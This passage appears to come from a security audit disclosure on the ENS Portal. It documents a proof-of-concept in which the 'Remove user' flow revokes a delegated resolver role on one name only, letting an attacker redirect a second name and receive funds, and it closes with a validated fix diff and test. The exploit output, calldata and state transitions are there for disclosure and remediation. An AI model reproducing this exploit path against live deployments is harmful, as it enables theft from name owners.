        payoutAfter: payoutAfter.toString(),
        payoutGain: (payoutAfter - payoutBefore).toString(),
      },
      null,
      2,
    ),
  )
})
```

### Actual vulnerable-run output

The final clean one-command execution produced:

```
RUN  v4.1.5 /root/audits/ens/frozen-src/apps/portal

[makeName] registering c014-alpha-1787627347.eth
[makeName] waiting 61s for MIN_COMMITMENT_AGE
[makeName] registered c014-alpha-1787627347.eth
[makeName] registering c014-beta-1787627349.eth
[makeName] waiting 61s for MIN_COMMITMENT_AGE
[makeName] registered c014-beta-1787627349.eth

✓ poc.local-chain.test.ts > C-014 local-chain end-to-end retained resolver authority
  > remove-all revokes one name only; attacker changes the other and receives funds

Test Files  1 passed (1)
Tests       1 passed (1)
```

The separate real-browser run against the frozen Portal also passed:

```
Running 1 test using 1 worker

✓ 1 [ens-001-portal-ui] › poc.playwright.spec.ts
  › real Portal Remove user UI leaves the second resource authorized

1 passed (32.1s)
```

The browser clicked this exact sequence:

```
Edit user roles
→ Remove user
→ Remove
→ Start
→ Open wallet
→ Done
```

The wallet request captured from the real Portal was:

```json
{
  "data": "0xbbd9abb50000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000001100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b15633031342d616c7068612d3137383736333931353803657468000000000000",
  "from": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
  "to": "0xE7bB16010fF2dEC4Eb019013CdBdBe5D149A5367",
  "value": "0x0"
}
```

Decoded transaction:

```json
{
  "functionName": "authorizeNameRoles",
  "args": [
    "0x15633031342d616c7068612d313738373633393135380365746800",
    "17",
    "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
    false
  ]
}
```

The transaction targets only the encoded alpha name. There is no second revoke for beta.

Authoritative state before removal:

```json
{
  "resolver": "0xE7bB16010fF2dEC4Eb019013CdBdBe5D149A5367",
  "alpha": "c014-alpha-1787639158.eth",
  "beta": "c014-beta-1787639160.eth",
  "attacker": "0x70997970C51812dc3a010C7d01b50e0d17dc79C8",
  "alphaTextBefore": true,
  "betaAddrBefore": true
}
```

Authoritative state after removal and exploitation:

```json
{
  "alphaAfter": false,
  "betaAfter": true,
  "resolvedAddress": "0x4444444444444444444444444444444444444444",
  "maliciousRecordTransaction": "0x0fb244831ba58694bb5b8bd62f7cdcbf2915aae7ba61fd6580fb20bc470856bc",
  "transferHash": "0xb748e3358fd7c167573b15ba544bd6b9d83a1c85ef9c17c09afd43db83bbf059",
  "payoutBefore": "7788359782708009698",
  "payoutAfter": "8788359782708009698",
  "payoutGain": "1000000000000000000"
}
```

The successful Portal-generated revoke receipt was:

```json
{
  "status": "success",
  "transactionHash": "0xc477b7eca4707251db9436da8ad7b5191ae18c77f388f794cc4c07e0a074650e",
  "blockNumber": "11561352",
  "gasUsed": "40890",
  "from": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
  "to": "0xe7bb16010ff2dec4eb019013cdbdbe5d149a5367"
}
```

These values establish all required transitions:

* the revoke transaction succeeded;
* alpha's delegated role changed from `true` to `false`;
* beta's delegated address role stayed `true`;
* the attacker changed beta's address record;
* Universal Resolver returned the payout address;
* the payout address gained exactly `1,000,000,000,000,000,000` wei.

### Experimental fix

The minimal safe design is to preserve the resource in the grouping key so each UI row represents exactly one authorization boundary. The following patch was applied only in an isolated validation worktree; it was not applied to the vulnerable evidence checkout:

```diff
diff --git a/apps/portal/src/lib/roles/resolverRoles.ts b/apps/portal/src/lib/roles/resolverRoles.ts
--- a/apps/portal/src/lib/roles/resolverRoles.ts
+++ b/apps/portal/src/lib/roles/resolverRoles.ts
@@ -196,7 +196,11 @@ export const groupRolesByAccount = <T extends RoleInput>(
     const decoded = decodeResolverRoleBitmap(role.roleBitmap)
     const resolvedName = resourceToName?.get(resource) ?? null
 
-    const existing = grouped.get(account)
+    // Preserve the authorization resource in the presentation key.
+    const groupKey = `${account}:${resource}`
+    const existing = grouped.get(groupKey)
 
     if (existing) {
       existing.roles.push(role)
@@ -205,7 +209,7 @@ export const groupRolesByAccount = <T extends RoleInput>(
     } else {
       const names = new Set<string>()
       if (resolvedName) names.add(resolvedName)
-      grouped.set(account, {
+      grouped.set(groupKey, {
         account,
         resolvedNames: names,
         roles: [role],
```

### Fix-validation test

```ts
import { describe, expect, it } from 'vitest'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
  resolverRoles,
} from '../../../fix-validation/apps/portal/src/lib/roles/resolverRoles'

const ATTACKER = '0x2222222222222222222222222222222222222222'

describe('ENS-001 experimental mitigation', () => {
  it('preserves one row per account and resolver resource', () => {
    const rows = groupRolesByAccount(
      [
        {
          account: ATTACKER,
          resource: computeNameResource('alpha.eth'),
          roleBitmap: resolverRoles.ROLE_SET_TEXT.toString(),
        },
        {
          account: ATTACKER,
          resource: computeNameResource('beta.eth'),
          roleBitmap: resolverRoles.ROLE_SET_ADDR.toString(),
        },
      ],
      buildResourceToNameMap([{ name: 'alpha.eth' }, { name: 'beta.eth' }]),
    )

    expect(rows).toHaveLength(2)
    expect(rows.map((row) => row.resolvedNames)).toEqual([
      ['alpha.eth'],
      ['beta.eth'],
    ])
    expect(rows[0].roles).toHaveLength(1)
    expect(rows[1].roles).toHaveLength(1)
    expect(rows[0].decodedRoles).toEqual(['ROLE_SET_TEXT'])
    expect(rows[1].decodedRoles).toEqual(['ROLE_SET_ADDR'])
  })
})
```

Fix-validation output:

```
RUN  v4.1.5 /root/audits/ens/frozen-src/apps/portal

✓ poc.fix-validation.test.ts > ENS-001 experimental mitigation
  > preserves one row per account and resolver resource

Test Files  1 passed (1)
Tests       1 passed (1)
Duration    1.18s
```

The vulnerable revision produces one row whose `resolvedNames` is:

```ts
['alpha.eth', 'beta.eth']
```

The fixed implementation produces:

```ts
[
  { resolvedNames: ['alpha.eth'], roles: [alphaRole] },
  { resolvedNames: ['beta.eth'], roles: [betaRole] },
]
```

Therefore, removing the alpha row can no longer claim to represent or revoke beta. The lost `(account, resource)` binding is restored, and the exploit primitive is blocked.

An alternative valid product design is to retain one account row but iterate every original `(resource, bitmap)` assignment and submit one revoke per resource. In that design, completion must be reported only after every resource-specific transaction succeeds.
